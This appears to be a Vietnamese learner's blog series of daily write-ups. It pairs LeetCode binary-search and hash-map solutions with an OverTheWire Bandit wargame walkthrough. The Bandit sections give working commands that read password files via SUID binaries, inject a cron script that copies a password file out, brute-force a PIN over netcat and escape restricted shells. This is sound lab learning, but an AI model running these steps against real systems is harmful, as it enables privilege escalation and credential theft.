---
title: "Day 1: Binary Search, SUID Privilege Escalation & Cron Jobs"
date: "2026-10-07"
author: "Phạm Nguyễn Hoàng Long"
category: "DevSecOps Training"
tags: ["LeetCode", "CTF", "Bandit", "DevSecOps", "BinarySearch", "Linux"]
---

# 🚀 Tóm tắt rèn luyện ngày 07/10/2026

## 🧠 Phân môn Thuật toán (Algorithm)

### [LeetCode 35: Search Insert Position (Easy)](https://leetcode.com/problems/search-insert-position/)
* **Chủ đề:** Mảng (Array), Tìm kiếm nhị phân (Binary Search).
* **Độ phức tạp:** Thời gian $O(\log n)$ | Không gian $O(1)$

**Mã nguồn (C++):**
```cpp
class Solution {
public:
    int searchInsert(vector<int>& nums, int target) {
        int n = nums.size();
        int left = 0;
        int right = n - 1;
        while(left <= right){
            // Sử dụng phép trừ để tính mid, ngăn chặn nguy cơ Integer Overflow 
            // nếu mảng có kích thước cực lớn (Một thói quen tốt cho DevSecOps)
            int mid = left + (right - left) / 2; 
            
            if(nums[mid] == target){
                return mid;
            }
            else if(nums[mid] < target){
                left = mid + 1;
            }
            else {
                right = mid - 1;
            }
        }
        // Điểm mấu chốt: Trả về left khi không tìm thấy target
        return left; 
    }
};
Điểm dễ sai sót nhất của bài này là xác định giá trị trả về khi vòng lặp while kết thúc. Khi điều kiện left <= right bị phá vỡ (tức left > right), con trỏ left luôn vượt qua các phần tử nhỏ hơn target và trỏ chính xác vào phần tử đầu tiên lớn hơn target. Do đó, left chính là index hoàn hảo để chèn số mới vào mà vẫn giữ được tính chất mảng tăng dần.
'''
🛡️ Phân môn Hệ thống & Bảo mật (OverTheWire: Bandit)
1. Bandit Level 19 → 20: Kỹ thuật SUID & Job Control
Mục tiêu: Đọc mật khẩu thông qua một file thực thi có gắn quyền SUID (suconnect).
Lỗ hổng khai thác: Local Privilege Escalation (Leo thang đặc quyền cục bộ).
# Bước 1: Mở cổng mạng lắng nghe ngầm và nạp sẵn mật khẩu cũ
cat /etc/bandit_pass/bandit20 | nc -l -p 1234 &

# Bước 2: Chạy file SUID để tự động gọi vào cổng
./suconnect 1234
Phân tích kỹ thuật:
Bản thân tài khoản bandit20 không có quyền đọc file mật khẩu của bandit21. Tuy nhiên, file suconnect được gắn cờ s (SUID) và thuộc sở hữu của bandit21. Khi chạy lệnh này, Linux tạm thời cấp đặc quyền của người sở hữu cho tiến trình. Kết hợp với việc sử dụng ký tự & (đẩy tiến trình Netcat xuống chạy nền), ta có thể thao tác đồng thời cả hai luồng mạng trên cùng một terminal.
2. Bandit Level 21 → 22: Rủi ro từ Cron Jobs
Mục tiêu: Truy vết mật khẩu bị rò rỉ qua các tiến trình tự động của hệ thống.
Quy trình truy vết:
# 1. Liệt kê và kiểm tra các tác vụ cron đang được cấu hình
ls -la /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22     

# Kết quả: cron tự động chạy file /usr/bin/cronjob_bandit22.sh mỗi phút (* * * * *)

# 2. Phân tích mã nguồn script để xem logic xử lý mật khẩu
cat /usr/bin/cronjob_bandit22.sh     

# Kết quả: Script lưu bản sao mật khẩu vào thư mục /tmp/

# 3. Lấy cờ từ file rò rỉ
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
🎯 Góc nhìn DevSecOps (Mindset Review)
Quá trình rèn luyện hôm nay là sự đối chiếu rõ nét giữa tư duy xây dựng và tư duy phá hủy:
1. Góc nhìn Dev: Khi viết mã (như trong bài LeetCode), việc kiểm soát các trường hợp biên như Integer Overflow (tràn số) bằng cách tối ưu công thức tính mid là lớp phòng thủ đầu tiên.
2. Góc nhìn Sec/Ops: Việc sử dụng bừa bãi quyền SUID (như bài Bandit 20) hoặc thiết lập Cron jobs với các file bash có quyền ghi (write) lỏng lẻo (như bài Bandit 22) có thể làm vô hiệu hóa mọi nỗ lực bảo mật hệ thống. Một tiến trình chạy ngầm với đặc quyền cao luôn là mục tiêu ưa thích của tin tặc để cài cắm Backdoor.





# Write-up Day 02: Binary Search 2D, Cronjobs & Shell Script Injection

**Date:** 08/10/2026
**Topics:** Algorithms (Binary Search), Linux Sysadmin (Cron), Privilege Escalation, Git/GitHub.

---

## 1. Thuật toán: LeetCode 74 - Search a 2D Matrix

**Vấn đề gặp phải:** 
Ban đầu, tôi cố gắng áp dụng nguyên vẹn thuật toán Binary Search 1 chiều lên ma trận 2 chiều (`vector<vector<int>>`). Lỗi xảy ra khi tôi gọi `matrix[mid]` để so sánh với `target`. Trong C++, `matrix[mid]` trả về toàn bộ một mảng con (một hàng), chứ không phải một số nguyên cụ thể, dẫn đến lỗi biên dịch. Hơn nữa, tôi chưa khởi tạo số lượng hàng và cột của ma trận.

**Cách giải quyết & Giải thích Pattern:**
Để đạt độ phức tạp `O(log(m * n))`, ta phải coi ma trận 2D như một mảng 1D trải dài.

1. **Khai báo kích thước:**
   - `int m = matrix.size();` (Lấy số lượng mảng con -> Số Hàng)
   - `int n = matrix[0].size();` (Lấy số lượng phần tử của mảng con đầu tiên -> Số Cột)

2. **Ánh xạ Index (1D -> 2D):** 
   Giả sử mảng có `n` cột. Khi con trỏ Binary Search đang ở vị trí `mid` trên "mảng 1D ảo", ta tìm tọa độ thật của nó trên ma trận bằng công thức:
   - **Hàng (Row) = `mid / n`**: Phép chia lấy phần nguyên cho biết ta đã lướt qua bao nhiêu hàng trọn vẹn.
   - **Cột (Col) = `mid % n`**: Phép chia lấy phần dư cho biết vị trí chính xác của phần tử đó ở hàng hiện tại.
   
   *Áp dụng vào code:* 
   ```cpp
   int mid_value = matrix[mid / n][mid % n];


## 2. Linux Security: OverTheWire - Bandit (Level 22 -> 24)
#  Bandit 22 → 23: Dịch ngược cơ chế sinh tên file
Nhiệm vụ: Tìm cờ được giấu bởi một cronjob chạy ngầm.

Vấn đề: File kịch bản của hệ thống sử dụng biến $myname để tạo tên file chứa mật khẩu. Khi gọi cat /tmp/$mytarget trên terminal, hệ thống báo lỗi cat: /tmp/: Is a directory vì biến rỗng (chỉ có giá trị khi script được chạy bởi cron).

Cách giải quyết: Đóng giả hệ thống bằng cách tự chạy lệnh hash thủ công với user là

echo I am user bandit23 | md5sum | cut -d ' ' -f 1
echo: In chuỗi đầu vào.

| (Pipe): Chuyền chuỗi vừa in sang lệnh tiếp theo.

md5sum: Mã hóa chuỗi thành mã băm 32 ký tự.

cut -d ' ' -f 1: Dùng khoảng trắng (-d ' ') làm vách ngăn để cắt chuỗi, và chỉ lấy khối dữ liệu đầu tiên (-f 1), qua đó loại bỏ các ký tự rác (dấu gạch ngang) sinh ra từ hàm băm.
#  Bandit 23 → 24: Leo thang bằng Shell Script (Payload Injection)
Nhiệm vụ: Lợi dụng cronjob quét thư mục /var/spool/bandit24/foo (chạy mọi script bên trong với quyền bandit24 rồi xóa đi) để đánh cắp mật khẩu.
1. Tạo Workspace an toàn:
Tạo thư mục làm việc và cấp quyền 777 (cho phép tiến trình ngầm bandit24 có quyền ghi kết quả trả về).
mkdir /tmp/hoanglong24
chmod 777 /tmp/hoanglong24
cd /tmp/hoanglong24
2. Viết Script khai thác (Payload):
echo '#!/bin/bash' > myscript.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/hoanglong24/password.txt' >> myscript.sh
chmod +x myscript.sh
#!/bin/bash (Shebang): Báo cho hệ thống biết đây là script chạy bằng Bash. Dấu > ghi đè tạo file mới.

Dấu >> giúp viết nối lệnh lấy cờ vào cuối file mà không đè mất dòng Shebang.

Lệnh cat bên trong script sẽ lấy quyền của bandit24 đọc file mật khẩu gốc và đẩy kết quả về thư mục trung gian của mình.

chmod +x: Cấp quyền "Thực thi" (eXecute) để script chạy được.
3. Kích hoạt bẫy:
Copy myscript.sh vào thư mục đích /var/spool/bandit24/foo, đợi tối đa 1 phút cho cronjob chạy, sau đó đọc file password.txt để lấy cờ.
#3. MINDSET
Bảo mật không phải là phép thuật, mà là sự thấu hiểu hệ thống sâu sắc hơn cả người tạo ra nó. Hôm nay, khi bạn lợi dụng cronjob để đánh cắp mật khẩu trong Bandit, bạn không dùng một phần mềm hack nào phức tạp. Bạn chỉ đơn giản là hiểu rõ cách Linux tự động hóa công việc và chèn mã kịch bản vào đúng điểm mù của luồng thực thi. Đó chính là tư duy cốt lõi của lộ trình này: Nghĩ như một kẻ tấn công, nhưng hành động với sự kỷ luật của một kỹ sư hệ thống.

Bài toán ma trận LeetCode 74 lại mang đến một bài học khác về sự linh hoạt trong góc nhìn. Việc trải phẳng một không gian 2D thành một đường thẳng 1D trong tâm trí chứng minh rằng nhiều chướng ngại vật kỹ thuật có thể được giải quyết rất nhanh chóng nếu ta biết cách chuyển đổi cấu trúc dữ liệu. Khả năng nhìn thấu bề mặt của hệ thống và đưa nó về dạng cơ bản nhất là kỹ năng sống còn khi bạn phải thiết kế kiến trúc DevSecOps sau này.
# Write-up: LeetCode 875 & OverTheWire Bandit 24–25

## 1. LeetCode 875 — Koko Eating Bananas

**Đề bài:** Tìm tốc độ ăn `k` nhỏ nhất để ăn hết `n` đống chuối trong `h` giờ
(mỗi giờ chỉ ăn từ một đống, tối đa `k` quả).

**Ý tưởng:** `k` càng lớn thì số giờ cần càng ít → tính đơn điệu → binary
search trên **không gian đáp án** `[1, max(piles)]`.

```cpp
class Solution {
public:
    int minEatingSpeed(vector<int>& piles, int h) {
        int left = 1, right = *max_element(piles.begin(), piles.end());
        while (left < right) {
            int mid = left + (right - left) / 2;
            if (canfinish(piles, h, mid)) right = mid;
            else left = mid + 1;
        }
        return left;
    }
private:
    bool canfinish(const vector<int>& piles, int h, int k) {
        long long hours = 0;
        for (int p : piles) hours += (p + (long long)k - 1) / k;
        return hours <= h;
    }
};
```

**Điểm then chốt:**
- **Làm tròn lên bằng số nguyên:** `⌈p/k⌉ = (p + k - 1) / k`, vì chia nguyên
  mặc định làm tròn xuống.
- **`left < right` + `right = mid`**: dùng cho bài toán "tìm giá trị nhỏ nhất
  thỏa điều kiện" — khác với "tìm giá trị chính xác" (`left <= right`,
  `right = mid - 1`). Dùng sai cặp quy ước dễ gây lặp vô hạn hoặc lệch kết quả.
- `hours` phải kiểu `long long` vì `piles[i]` tới 10⁹, dễ tràn `int`.

**Độ phức tạp:** `O(n log(max(piles)))` thời gian, `O(1)` bộ nhớ.

---

## 2. Bandit 24 → 25 — Brute-force pincode

**Đề bài:** Daemon ở cổng `30002` trả về mật khẩu bandit25 nếu nhận đúng mật
khẩu bandit24 + pin 4 số, qua **một** kết nối duy nhất.

```bash
(for i in $(seq 0 9999); do
  printf "%s %04d\n" "<password_bandit24>" "$i"
done) | nc localhost 30002
```

- `seq 0 9999` sinh 10000 số; `for` lặp qua từng số, gọi `printf` cho mỗi số.
- `%s` → mật khẩu; `%04d` → pin đệm đủ 4 chữ số; `\n` → mỗi lần thử một dòng
  (daemon đọc theo dòng).
- `( ... ) | nc` gộp toàn bộ 10000 dòng gửi qua một kết nối TCP duy nhất.

**Lỗi hay gặp:** thiếu `%` trước `04d`, viết hoa `%S`, thiếu `\n` (dính liền
10000 dòng), thiếu `$` trước `(seq ...)`, hoặc chạy cú pháp Bash trong
PowerShell (phải chạy trong Bash thật trên server).

---

## Bài học

- Binary search trên đáp án áp dụng khi điều kiện là hàm đơn điệu theo tham
  số cần tìm, không chỉ trên mảng có sẵn.
- Khi sinh dữ liệu brute-force bằng `printf`/`for`, cần kiểm soát chặt định
  dạng (`%s`, `%04d`, `\n`) vì mỗi ký tự sai đều khiến request gửi đi không
  hợp lệ.
## 3. Linux Security: OverTheWire - Bandit (Level 25 -> 26)

**Nhiệm vụ:** Đăng nhập vào user `bandit26` bằng khóa SSH (Private Key) lấy từ `bandit25`. Tuy nhiên, shell mặc định của `bandit26` không phải là `/bin/bash` mà là một kịch bản tùy chỉnh khiến kết nối bị đóng ngay lập tức. Mục tiêu là tìm cách thoát khỏi lớp vỏ bọc này (Shell Breakout) để chiếm quyền điều khiển.

### Phân tích cơ chế giới hạn (Restricted Shell)
Khi kiểm tra file `/etc/passwd`, shell của `bandit26` được cấu hình là `/usr/bin/showtext`. Script này sử dụng lệnh `more` để hiển thị một đoạn logo văn bản. 
Đặc tính của lệnh `more` là:
- Nếu màn hình Terminal đủ lớn để hiển thị toàn bộ nội dung, nó sẽ in ra hết và lập tức kết thúc tiến trình.
- Khi tiến trình `more` kết thúc, phiên SSH cũng tự động bị ngắt (Disconnected).
- Nếu màn hình Terminal **nhỏ hơn** đoạn văn bản, `more` sẽ tạm dừng, hiển thị chữ `--More--` ở góc dưới để chờ người dùng cuộn trang. Tại trạng thái dừng này, ta có thể gọi trình soạn thảo `vi` bằng cách nhấn phím `v`.

### Các rào cản đã gặp và Cách khắc phục (Troubleshooting)

**1. Vấn đề 1: Lệnh `more` không chịu dừng lại dù đã thu nhỏ cửa sổ.**
- **Nguyên nhân:** Do các phần mềm Terminal hiện đại trên Windows đôi khi không gửi đúng thông số kích thước cửa sổ cho máy chủ Linux, khiến Linux vẫn tưởng màn hình đang rất to.
- **Giải pháp:** Sử dụng lệnh `stty rows 4` để "ép" hệ thống tin rằng chiều cao của terminal hiện tại chỉ có đúng 4 dòng, buộc lệnh `more` phải kích hoạt trạng thái chờ `--More--`.

**2. Vấn đề 2: Lỗi "Connecting from/to localhost is blocked".**
- **Nguyên nhân:** Hệ thống OverTheWire đã thay đổi chính sách, cấm người dùng kết nối vòng (localhost) từ `bandit25` sang `bandit26` để tiết kiệm tài nguyên.
- **Giải pháp:** Thay vì chạy lệnh SSH từ bên trong `bandit25`, ta phải sao chép nội dung file `bandit26.sshkey`, mang về máy cá nhân (local) và dùng nó để kết nối thẳng lên `bandit26`.

**3. Vấn đề 3: Lỗi "UNPROTECTED PRIVATE KEY FILE!" (Permissions 0777).**
- **Sự cố:** Dù đã dùng lệnh `chmod 600 bandit26_1` để bảo mật file khóa, SSH vẫn báo file này đang mở toang (0777) và từ chối kết nối.
- **Giải thích bản chất DevSecOps:** Môi trường tôi đang dùng là **WSL (Windows Subsystem for Linux)**, và file khóa đang nằm ở đường dẫn `/mnt/c/Users/ACER/...`. Đây là thư mục thuộc phân vùng NTFS của Windows được ánh xạ vào Linux. Hệ thống tập tin NTFS của Windows **không tương thích** với cơ chế phân quyền POSIX của Linux. Do đó, lệnh `chmod` bị vô hiệu hóa ngầm, Linux không thể can thiệp vào quyền của file này.
- **Cách khắc phục:** Di chuyển file khóa ra khỏi vùng `/mnt/c/...` và đưa về thư mục gốc thuần Linux của user hiện tại (`~/`). 
  ```bash
  mv bandit26_1 ~/
  cd ~/
  chmod 600 bandit26_1
# Write-up: Bandit 27–29 & LeetCode 153

## 1. Bandit 27 → 28 — Git clone cơ bản

**Đề bài:** Có git repo tại `ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo`, cổng `2220`. Clone từ máy local, tìm mật khẩu bandit28.

```bash
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
cd repo && ls -la && cat README.md
```

Mật khẩu nằm ngay trong file hiện tại, không cần xem lịch sử commit.

**Lưu ý:** URL dạng `ssh://` phải chỉ rõ cổng bằng `:2220` ngay sau hostname —
nếu thiếu, `git clone` sẽ mặc định nối cổng 22 và bị từ chối
(`Permission denied`, báo "not intended" port).

---

## 2. Bandit 28 → 29 — Mật khẩu ẩn trong lịch sử commit

**Đề bài:** Tương tự level 27, nhưng với `bandit28-git` / repo của bandit28.

```bash
git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo repo28
cd repo28 && cat README.md
```

Lần này file hiện tại che mật khẩu bằng `xxxxxxxxxx`. Xem lịch sử commit:

```bash
git log --all --oneline
```
```
de09b82 (HEAD -> master) fix info leak
ad8a5f8 add missing data
e4337f1 initial commit of README.md
```

Commit `fix info leak` chính là commit đã **xóa** mật khẩu thật. Mật khẩu nằm
ở commit **trước đó**:

```bash
git show ad8a5f8:README.md
```

**Mẹo nhanh hơn:** `git log -p -- README.md` in luôn toàn bộ diff qua từng
commit của một file, khỏi phải tra từng hash.

**Lưu ý:** khi clone vào thư mục đã tồn tại tên `repo` (từ level trước), git
báo lỗi `destination path 'repo' already exists`. Đặt tên thư mục đích khác
bằng tham số thứ hai: `git clone <url> repo28`.

---

## 3. LeetCode 153 — Find Minimum in Rotated Sorted Array

**Đề bài:** Mảng tăng dần bị xoay `k` lần (`k` không biết trước), các phần tử
không trùng nhau. Tìm phần tử nhỏ nhất, yêu cầu `O(log n)`.

**Ý tưởng:** Mảng sau khi xoay gồm hai đoạn tăng dần nối tiếp, đoạn sau luôn
nhỏ hơn đoạn trước — điểm nối chính là đáp án. Binary search bằng cách so
`nums[mid]` với `nums[right]`:
- `nums[mid] > nums[right]` → điểm gãy nằm bên phải `mid` → `left = mid + 1`.
- `nums[mid] <= nums[right]` → đoạn `[mid, right]` không có điểm gãy → đáp án
  ở `mid` hoặc bên trái → `right = mid`.

```cpp
int findMin(vector<int>& nums) {
    int left = 0, right = nums.size() - 1;
    while (left < right) {
        int mid = left + (right - left) / 2;
        if (nums[mid] > nums[right]) left = mid + 1;
        else right = mid;
    }
    return nums[left];
}
```

**Vì sao so với `nums[right]` chứ không phải `nums[left]`:** so với `nums[left]`
không phân biệt được giữa "chưa gặp điểm gãy, điểm gãy ở bên phải" và "mảng
không hề bị xoay". So với `nums[right]` xử lý đúng cả hai trường hợp bằng
cùng một logic.

**Lỗi đã gặp khi tự viết:** gán nhầm `mid = right` thay vì `right = mid` —
dòng này không ảnh hưởng gì tới `left`/`right` (vì `mid` được tính lại mỗi
vòng), khiến vòng lặp không bao giờ thu hẹp → lặp vô hạn → Time Limit
Exceeded. Luôn thay đổi `left`/`right`, không phải `mid`, để cập nhật phạm vi
tìm kiếm.

**Độ phức tạp:** `O(log n)` thời gian, `O(1)` bộ nhớ.
# Write-up: Bandit 29–32 & LeetCode 1 (Two Sum)

## 1. Bandit 29 → 30 — Mật khẩu ở branch khác

```bash
git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo repo29
cd repo29 && cat README.md   # thấy "<no passwords in production!>" — placeholder
```

Kiểm tra toàn bộ nhánh:
```bash
git log --all --oneline
```
```
5a4df04 (HEAD -> master) fix username
a6fec80 (origin/dev) add data needed for development
da4e680 (origin/sploits-dev) add some silly exploit, just for shit and giggles
d35a439 initial commit of README.md
```
Nhánh `origin/dev` chứa dữ liệu thật (khác bản "production" đã bị che):
```bash
git show a6fec80:README.md
```

---

## 2. Bandit 30 → 31 — Mật khẩu ở tag ẩn (hidden ref)

```bash
git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo repo30
cd repo30 && cat README.md   # "just an epmty file... muahaha" — trêu đùa, không có gì
```

`git log --all`, `git fsck --unreachable`, `git notes list` đều không ra gì. Thử
liệt kê **toàn bộ ref** (không chỉ branch/tag thông thường):

```bash
git show-ref
```
```
bfc06d1... refs/heads/master
bfc06d1... refs/remotes/origin/HEAD
bfc06d1... refs/remotes/origin/master
6a76bc8... refs/tags/secret          ← tag ẩn, không hiện qua `git tag -l`
```

```bash
git show refs/tags/secret
```
→ in ra mật khẩu trực tiếp.

**Bài học:** `git tag -l` có thể không liệt kê hết mọi ref; `git show-ref`
(không tham số) in ra tất cả, kể cả ref bất thường.

---

## 3. Bandit 31 → 32 — Push file theo yêu cầu server

```bash
git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo repo31
cd repo31 && cat README.md
```
```
Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master
```

```bash
echo 'May I come in?' > key.txt
git add -f key.txt        # -f cần thiết vì .gitignore có thể đang chặn key.txt
git commit -m "add key.txt"
git push origin master
```

Server validate nội dung file ngay trong quá trình nhận push, in mật khẩu ra
`remote:` log trước khi cố tình từ chối (`pre-receive hook declined`) —
`[remote rejected]` là hành vi dự kiến của level, không phải lỗi.

---

## 4. LeetCode 1 — Two Sum

**Đề bài:** Tìm chỉ số hai phần tử trong mảng có tổng bằng `target`, chỉ có
đúng một đáp án, không dùng lại cùng một phần tử.

**Sai lầm ban đầu:** áp nhầm pattern sliding window (chỉ xét cặp liền kề) —
không đúng vì hai số cần tìm có thể nằm ở bất kỳ vị trí nào trong mảng, không
nhất thiết liên tiếp.

**Lời giải đúng — hash map, O(n):**
```cpp
vector<int> twoSum(vector<int>& nums, int target) {
    unordered_map<int, int> seen; // value -> index
    for (int i = 0; i < nums.size(); i++) {
        int need = target - nums[i];
        if (seen.count(need)) return {seen[need], i};
        seen[nums[i]] = i;
    }
    return {};
}
```

**Cơ chế:**
- `need = target - nums[i]`: số còn thiếu để đủ tổng.
- `seen.count(need)`: tra cứu O(1) xem `need` đã gặp trước đó chưa (thay vì
  dò lại cả mảng — đây là lý do đạt O(n) thay vì O(n²)).
- `seen[nums[i]] = i`: lưu lại **sau** khi kiểm tra, tránh phần tử tự ghép với
  chính nó.
- `map[key]` dùng ngoặc **vuông** để đọc/ghi value; `map.count(key)` dùng
  ngoặc **tròn** vì là gọi hàm kiểm tra tồn tại key — không nhầm hai cú pháp.

**Độ phức tạp:** O(n) thời gian, O(n) bộ nhớ (cho hash map).
# Write-up: Bandit 32 → 33 — Thoát khỏi Uppershell

**Đề bài:** Shell của bandit33 là một chương trình đặc biệt, không phải
`/bin/bash`. Tìm cách thoát ra.

**Phân tích:**
```bash
$ ls -la
-rwsr-x--- 1 bandit33 bandit32 15136 Sep 26 21:53 uppershell
```
File `uppershell` có cờ **setuid** (`s` trong quyền chủ sở hữu) — chạy với
quyền của bandit33. Khi SSH vào, màn hình hiện:
```
WELCOME TO THE UPPERCASE SHELL
>>
```
Mọi lệnh gõ vào đều bị **chuyển thành chữ IN HOA** trước khi thực thi (ví dụ
`ls` → `LS`), nên mọi lệnh thường đều báo "command not found" vì Linux phân
biệt hoa-thường và không có lệnh nào tên `LS`.

**Khai thác:**
```bash
>> $0
$
```
`$0` là biến chứa **đường dẫn tới shell hiện tại** — giá trị này vốn đã lưu
sẵn dạng chữ thường trong bộ nhớ (không phải ký tự người dùng gõ ra nên không
bị chuyển hoa). Gõ `$0` khiến chương trình thực thi lại chính shell đó, mở ra
một **bash thật**, thoát khỏi giới hạn chữ hoa.

Sau đó tìm mật khẩu như bình thường:
```bash
$ cat /etc/bandit_pass/bandit33
```

**Bài học:** Khi một "bộ lọc" chặn các ký tự/lệnh người dùng gõ vào, các biến
**có sẵn giá trị trong môi trường** (`$0`, `$SHELL`, biến môi trường khác)
thường không đi qua bộ lọc đó — vì bộ lọc xử lý *input thô*, còn biến được
*shell tự thay thế (expand)* bằng giá trị đã lưu sẵn trước khi bị chuyển đổi.

---

Hoàn thành toàn bộ chuỗi Bandit (Level 0 → 33). Level 34 chưa tồn tại tại thời
điểm làm bài.
# Write-up tổng kết: OverTheWire Bandit (Level 0 → 33)

Hoàn thành toàn bộ chuỗi Bandit hiện có. Level 34 chưa tồn tại tại thời điểm
làm bài.

## Nhóm kỹ năng đã rèn luyện

### Level 0–23: Nền tảng Linux & thao tác file
Làm quen với `ssh`, điều hướng thư mục, quyền file (`chmod`, SUID/SGID), nén
và giải nén (`tar`, `gzip`, `bzip2`), mã hóa cơ bản (base64, ROT13, hex, xxd),
tìm kiếm file (`find`), xử lý văn bản (`grep`, `sort`, `cut`, `awk`), socket
và mạng cơ bản (`nc`, SSL/`openssl`), cron job, và các binary SUID khai thác
qua biến môi trường hoặc `PATH`.

### Level 24 → 25: Brute-force qua socket
Daemon lắng nghe ở một cổng cố định, yêu cầu gửi mật khẩu + pin 4 chữ số qua
**một kết nối duy nhất**. Dùng `for`/`seq`/`printf` sinh 10000 dòng thử, pipe
thẳng vào `nc`:
```bash
(for i in $(seq 0 9999); do printf "%s %04d\n" "<password>" "$i"; done) | nc localhost 30002
```
**Điểm mấu chốt:** `%04d` làm tròn đủ 4 chữ số, `\n` tách từng lượt thử, toàn
bộ output của vòng lặp được pipe qua một kết nối `nc` duy nhất thay vì mở lại
kết nối cho mỗi lần thử.

### Level 25 → 26: Thoát khỏi restricted shell qua `more`
Shell của user là script chỉ chạy `more ~/text.txt` rồi thoát. Nếu nội dung
dài hơn màn hình, `more` dừng ở `--More--`, tại đó phím `v` mở `vi`, và từ
`vi` dùng `:set shell=/bin/bash` + `:shell` để lấy shell thật. Trick: **thu
nhỏ cửa sổ terminal** trước khi SSH để buộc nội dung tràn quá một trang.
Đăng nhập bằng **SSH private key** (không phải mật khẩu), đúng cổng `2220`
(không phải `localhost` cổng 22 mặc định), và thêm cờ
`-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa` cho key
RSA cũ.

### Level 26 → 27: SUID binary chạy lệnh thay vì đọc file
Binary setuid nhận tham số như một **lệnh để thực thi**, không phải đường dẫn
file để đọc:
```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

### Level 27 → 31: Git — đọc và ghi lịch sử
Chuỗi 4 level xoay quanh git, mỗi level thêm một lớp khó:
- **27→28:** mật khẩu nằm ngay trong `README.md` sau khi `git clone`.
- **28→29:** mật khẩu bị xóa ở commit mới nhất ("fix info leak"); tìm lại ở
  commit trước đó bằng `git show <hash>:README.md`.
- **29→30:** mật khẩu bị thay bằng placeholder trên `master`; dữ liệu thật
  nằm ở một **branch khác** (`origin/dev`), tìm qua `git log --all --oneline`.
- **30→31:** không có gì trong commit, branch, hay dangling object
  (`git fsck --unreachable` rỗng); mật khẩu nằm ở một **tag ẩn**, chỉ thấy
  qua `git show-ref` (không dùng `--all`, flag này không tồn tại cho lệnh
  này) thay vì `git tag -l`.

**Lưu ý chung cho URL SSH git:** luôn chỉ rõ cổng bằng `:2220` ngay sau
hostname (`ssh://user@host:2220/path`), nếu không sẽ mặc định nối cổng 22 và
bị từ chối.

### Level 31 → 32: Push file theo yêu cầu server
Server validate nội dung file trong lúc nhận push, trả mật khẩu qua log
`remote:` trước khi cố tình từ chối push (`pre-receive hook declined`):
```bash
echo 'May I come in?' > key.txt
git add -f key.txt   # -f vì .gitignore có thể đang chặn file
git commit -m "add key.txt"
git push origin master
```

### Level 32 → 33: Thoát khỏi "uppershell"
Mọi lệnh gõ vào bị tự động chuyển thành chữ HOA trước khi chạy, khiến lệnh
thường luôn báo "not found". Biến `$0` (đường dẫn shell hiện tại) đã có sẵn
giá trị chữ thường trong bộ nhớ, không bị bộ lọc input chạm tới:
```bash
>> $0
$
```
Mở ra bash thật, đọc mật khẩu bình thường.

## Bài học xuyên suốt

1. **Luôn đọc kỹ file cấu hình và script** (`/etc/passwd`, nội dung shell)
   trước khi đoán cách khai thác — đáp án thường nằm ngay trước mắt.
2. **Lỗi SSH `Permission denied` thường do 4 nguyên nhân:** sai phương thức
   xác thực (key vs password), sai cổng, thuật toán mã hóa bị chặn, hoặc
   quyền file key quá rộng — kiểm tra lần lượt từng nguyên nhân.
3. **Git lưu trữ nhiều hơn những gì `git log` mặc định hiển thị:** branch
   khác, tag ẩn, commit cũ bị "xóa" trên HEAD — luôn kiểm tra `--all`,
   `show-ref`, `fsck --unreachable` khi nghi ngờ dữ liệu bị giấu.
4. **Bộ lọc input (restricted shell, uppercase shell...) thường chỉ chặn
   những gì người dùng gõ trực tiếp**, không chặn được giá trị đã có sẵn
   trong biến môi trường (`$0`, `$SHELL`) hay cơ chế shell tự mở rộng
   (`more` → `vi` → `:shell`).
# [DevSecOps Automation] Xây dựng công cụ CLI tự động hóa kết nối SSH 

**Date:** 16/10/2026
**Topics:** Bash Scripting, Automation, SSH Protocol, Defensive Programming.

---

## 1. Đặt vấn đề (The Problem)
Trong quá trình giải quyết các thử thách của hệ thống OverTheWire (Bandit Wargame), tôi nhận thấy một thao tác lặp đi lặp lại rất tốn thời gian: Cứ qua mỗi level, tôi lại phải gõ thủ công một chuỗi lệnh SSH dài dòng để đăng nhập (`ssh banditX@bandit.labs.overthewire.org -p 2220`), sau đó chờ hệ thống hỏi mật khẩu rồi mới copy/paste mật khẩu vào. 

Với tư duy của một kỹ sư DevSecOps, **bất cứ thứ gì phải làm thủ công từ 3 lần trở lên đều nên được tự động hóa**. Tuy nhiên, lệnh `ssh` mặc định được thiết kế để chặn việc truyền mật khẩu trực tiếp qua dòng lệnh (nhằm bảo mật). Do đó, tôi đã xây dựng một công cụ Bash Script nhỏ gọn kết hợp với `sshpass` để giải quyết triệt để rào cản này.

## 2. Mã nguồn công cụ (The Script: `bandit.sh`)

Công cụ này cho phép tôi đăng nhập vào bất kỳ level nào chỉ với một cú pháp duy nhất: 
`./bandit.sh <level> "<password>"`

```bash
#!/bin/bash

# Khối lập trình phòng thủ: Kiểm tra số lượng tham số đầu vào
if [ "$#" -ne 2 ]; then
    echo "Loi: Thieu hoac sai tham so!"
    echo "Cach dung: ./bandit.sh <level> <password>"
    echo "Vi du: ./bandit.sh 27 \"STJLJBRRph...\""
    exit 1
fi

LEVEL=$1
PASSWORD=$2

echo "Dang tu dong ket noi toi Bandit Level $LEVEL..."

# Thực thi SSH tự động bỏ qua cảnh báo Host Key và tự động điền mật khẩu
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no bandit$LEVEL@bandit.labs.overthewire.org -p 2220
# Write-up: LeetCode 242 - Valid Anagram

* **Độ khó:** Easy
* **Dạng bài (Pattern):** Hash Table / Frequency Counting / Array
* **Đường dẫn:** [242. Valid Anagram](https://leetcode.com/problems/valid-anagram/)

---

## 1. Tóm tắt đề bài
Cho hai chuỗi $s$ và $t$. Kiểm tra xem $t$ có phải là **từ đảo chữ** (anagram) của $s$ hay không. 

> **Anagram là gì?** Hai chuỗi là anagram của nhau nếu chúng được tạo thành từ cùng một tập hợp các ký tự với số lần xuất hiện của mỗi ký tự hoàn toàn giống nhau, chỉ khác biệt ở thứ tự sắp xếp.

---

## 2. Tư duy giải thuật (Intuition)

